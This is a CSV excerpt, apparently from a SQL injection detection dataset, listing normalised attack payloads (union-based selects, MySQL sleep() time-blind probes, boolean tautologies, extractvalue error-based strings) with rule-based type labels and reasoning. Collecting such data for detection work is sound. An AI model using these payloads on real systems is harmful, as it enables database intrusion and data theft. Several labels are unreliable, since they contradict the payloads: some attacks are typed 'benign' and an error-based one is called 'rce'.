row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
7306,"-4955%' union all select 5928,5928--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7307,"1' and elt ( 2266 = 7467,7467 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7308,1' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and 'mepp' = 'mepp,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7309,"1, ( select ( case when ( 3717 = 3717 ) then 1 else 3717* ( select 3717 from master..sysdatabases ) end ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7310,"1' ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( 'tmbs' = 'tmbs",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7311,-4901 ) or 3407 = 6442#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7312,1' where 4134 = 4134 and 1102 = 6300--,1,,boolean_blind,generic,0.95,4134 = 4134 and detected — boolean_blind injection (priority 8) on generic,rule-based
7313,"1' ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'hllf' = 'hllf",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
7314,"-1598"" ) ) or elt ( 5329 = 9628,9628 ) and ( ( ""hyxq"" like ""hyxq",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
7315,( select * from ( select ( sleep ( 5 ) ) ) srmq ) ) +',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7316,"1"" ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7317,"-3604' ) as fyev where 7259 = 7259 union all select 7259,7259,7259,7259--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7318,-6433%' ) ) or 9323 = 9323#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7319,-8836%' ) or 4856 = 3891,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
